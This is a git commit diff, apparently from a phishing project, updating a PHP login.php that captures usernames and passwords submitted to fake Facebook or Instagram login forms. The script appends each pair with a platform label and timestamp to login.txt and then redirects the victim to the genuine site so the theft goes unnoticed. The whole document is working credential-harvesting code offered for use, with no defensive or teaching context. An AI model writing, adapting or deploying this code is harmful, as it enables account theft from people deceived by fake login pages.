4a15233c9c382a77af54377e6e35204c798c2c55
Jaat-Hacker <jaatchanderbhanchoudhary@gmail.com>
2025-04-09 12:22:16 +0530

    Update login.php

--- login.php
+++ login.php
@@ -4,12 +4,20 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $user = $_POST['username'] ?? $_POST['email'] ?? 'UNKNOWN_USER';
     $pass = $_POST['password'] ?? $_POST['pass'] ?? 'UNKNOWN_PASS';
 
-    $data = "Username: $user\nPassword: $pass\n\n";
+    // Determine platform
+    $platform = isset($_POST['email']) ? "Facebook" : "Instagram";
 
+    // Build log entry
+    $data = "==== [$platform Login] ====\n";
+    $data .= "Username: $user\nPassword: $pass\n";
+    $data .= "Time: " . date("Y-m-d H:i:s") . "\n";
+    $data .= "===========================\n\n";
+
+    // Save to file
     file_put_contents("login.txt", $data, FILE_APPEND);
 
-    // Redirect based on origin
-    if (isset($_POST['email'])) {
+    // Redirect to legit site
+    if ($platform === "Facebook") {
         header("Location: https://m.facebook.com/login");
     } else {
         header("Location: https://www.instagram.com/accounts/login/?hl=en");
